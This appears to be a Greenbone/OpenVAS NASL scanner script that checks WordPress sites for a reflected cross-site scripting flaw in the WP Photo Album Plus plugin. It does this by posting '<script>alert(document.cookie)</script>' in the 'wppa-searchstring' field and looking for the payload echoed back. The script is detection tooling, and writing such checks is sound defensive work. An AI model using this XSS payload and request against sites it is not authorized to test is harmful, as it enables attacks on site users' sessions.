CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902698" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-12-31 14:00:10 +0530 (Mon, 31 Dec 2012)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "WordPress WP Photo Album Plus Plugin 'Search Photos' XSS Vulnerability" );
	script_xref( name: "URL", value: "http://k3170makan.blogspot.in/2012/12/wp-photoplus-xss-csrf-vuln.html" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/119152/wpphotoplussearch-xssxsrf.txt" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to insert arbitrary
HTML and script code, which will be executed in a user's browser session in the
context of an affected site when the malicious data is being viewed." );
	script_tag( name: "affected", value: "WordPress WP Photo Album Plus Plugin version 4.8.11 and prior" );
	script_tag( name: "insight", value: "Input passed via the 'wppa-searchstring' parameter to index.php
(when page_id is set to the Search Photos page) is not properly
sanitised before it is returned to the user." );
	script_tag( name: "solution", value: "Upgrade to WordPress WP Photo Album Plus Plugin version 4.8.12
or later." );
	script_tag( name: "summary", value: "This host is installed with WordPress WP Photo Album Plus Plugin
and is prone to cross site scripting vulnerability." );
	script_xref( name: "URL", value: "http://wordpress.org/plugins/wp-photo-album-plus/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
wppaurl = dir + "/?page_id=8";
wppaData = "wppa-searchstring=<script>alert(document.cookie)</script>";
wppaReq = NASLString( "POST ", wppaurl, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( wppaData ), "\\r\\n", "\\r\\n", wppaData );
wppaRes = http_keepalive_send_recv( port: port, data: wppaReq );
if(wppaRes && IsMatchRegexp( wppaRes, "HTTP/1\\.[0-9]+ 200" ) && ContainsString( wppaRes, "<script>alert(document.cookie)</script>" ) && ContainsString( wppaRes, "wppaPreviousPhoto" )){
	security_message( port );
}

